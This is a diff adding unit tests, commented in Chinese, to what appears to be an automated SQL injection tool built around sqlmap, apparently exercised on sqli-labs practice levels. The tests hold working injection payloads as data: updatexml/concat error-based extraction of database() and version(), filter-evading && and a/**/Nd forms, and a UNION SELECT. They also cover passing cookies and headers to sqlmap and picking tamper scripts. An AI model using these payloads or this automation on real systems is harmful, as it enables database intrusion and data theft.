@@ -10,8 +10,10 @@
   3) runner.merge_findings：跨参数并集；not_injectable 一轮可注即整体可注
   4) ai._clip_verdict：结构化摘要保头、原始输出保尾
 """
+import inspect
 import os
 import sys
+from pathlib import Path
 
 sys.stdout.reconfigure(encoding="utf-8", errors="replace")
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -507,6 +509,37 @@ def _payload_hint_tests():
                               "controlled": False}))
     check("UNION 回显仍优先于受控时间对",
           _extract_payload_hint(rows) == "1' UNION SELECT 1,2-- ")
+
+    # 2026-11-02 Less-25：同批证据里有取 version() 的 AI 探针、普通 and 的弱报错、
+    # 以及真正回显 database() 的 && 形态。深挖必须优先最后一条，否则精确复用会打空。
+    amp_db = "1'&&(updatexml(1,concat(0x7e,database(),0x7e),1))&&'1'='1"
+    rows2 = [
+        fake_ev("payload", "[error] version probe",
+                meta={"vector": "error",
+                      "payload": "1'\ta/**/Nd\tUpDaTeXmL(1,cOnCaT(0x7E,vErSiOn()),1)--\t"}),
+        fake_ev("payload", "[error] weak parse",
+                meta={"vector": "error",
+                      "payload": "zhangsan'and(updatexml(1,concat(0x7e,database(),0x7e),1))and'1'='1"}),
+        fake_ev("payload", "[error] amp db",
+                meta={"vector": "error", "payload": amp_db}),
+        fake_ev("payload", "[boolean] amp bool",
+                meta={"vector": "boolean", "payload": "1'&&(1=1)&&'1'='1"}),
+    ]
+    check("&& + database() 的确认 payload 优先于 version()/弱报错",
+          _extract_payload_hint(rows2) == amp_db,
+          f"(实际 {_extract_payload_hint(rows2)!r})")
+
+    from app.services.deep_exploit import _extract_payloads, _exact_error_payload
+    pls = _extract_payloads(rows2)
+    check("_extract_payloads 返回全部确认 payload（去重、保序）",
+          pls == [r.meta["payload"] for r in rows2], f"(实际 {pls})")
+    exact = _exact_error_payload(rows2[0].meta["payload"])
+    check("_exact_error_payload 只替换取值函数，保留 &&/tab/注释",
+          exact is not None and "database()" in exact
+          and "vErSiOn" not in exact and "a/**/Nd" in exact
+          and exact.endswith("--\t"), f"(实际 {exact!r})")
+    check("_exact_error_payload 非报错 payload 返回 None",
+          _exact_error_payload("1' and '1'='1") is None)
 
 
 def _char_union_tests():
@@ -1158,6 +1191,48 @@ def _sqlmap_cmd_tests():
           "--technique=BE" in cmd, f"→ {cmd}")
     check("run_sqlmap 收到的 --suffix 值完整（未被吞）",
           "--suffix" in cmd and cmd[cmd.index("--suffix") + 1] == "-- -", f"→ {cmd[-6:]}")
+
+    # Challenge/登录态靶场：会话 Cookie 必须下发到 sqlmap（Less-57/61 实测缺 Cookie 全 error）
+    cap2 = {}
+    class _FP2:
+        def __init__(self, cmd, **kw):
+            cap2["cmd"] = cmd
+            self.pid = 99902
+            self.stdout = iter(["[INFO] x\n"])
+        def wait(self, timeout=None):
+            return 0
+    runner.subprocess.Popen = _FP2
+    try:
+        runner.run_sqlmap(job_id=99902, url="http://t/x?id=1", method="POST",
+                          data="key=1&answer_key=Submit", param="id",
+                          exploit_mode=True, timeout_s=5,
+                          cookie="challenge=abc123", headers="Referer: http://t/")
+    finally:
+        runner.subprocess.Popen = orig
+    cmd2 = cap2.get("cmd", [])
+    check("run_sqlmap 下发会话 Cookie（--cookie）",
+          "--cookie" in cmd2 and cmd2[cmd2.index("--cookie") + 1] == "challenge=abc123",
+          f"→ {cmd2[-10:]}")
+    check("run_sqlmap 下发自定义 Header（--headers）",
+          "--headers" in cmd2 and cmd2[cmd2.index("--headers") + 1] == "Referer: http://t/",
+          f"→ {cmd2[-10:]}")
+
+    from app.services import deep_exploit as _de
+    check("and2amp 在 tamper 白名单内", "and2amp" in runner._ALLOWED_TAMPERS)
+    tamper_args = _de.pick_tamper_args("1'/**/a/**/Nd/**/updatexml(...)-- &&")
+    check("pick_tamper_args 可叠加 /**/ 与 && 形态",
+          tamper_args and "space2comment" in tamper_args[1]
+          and "and2amp" in tamper_args[1], f"→ {tamper_args}")
+    tamper_src = (Path(__file__).resolve().parents[2]
+                  / "tools/sqlmap/tamper/and2amp.py").read_text(encoding="utf-8")
+    check("and2amp 把 AND/OR 改写为 &&/||",
+          '"&&"' in tamper_src and '"||"' in tamper_src)
+    check("_prime_for_endpoint 先 GET 拿 challenge Cookie",
+          '"GET"' in inspect.getsource(_de._prime_for_endpoint))
+    check("_run 把 cookie 传给 sqlmap",
+          "cookie=session_cookie" in inspect.getsource(_de._run))
+    check("_replay_exact_error 用 database() 原样回显",
+          "_exact_error_payload" in inspect.getsource(_de._replay_exact_error))
 
 
 def _dbms_normalize_tests():
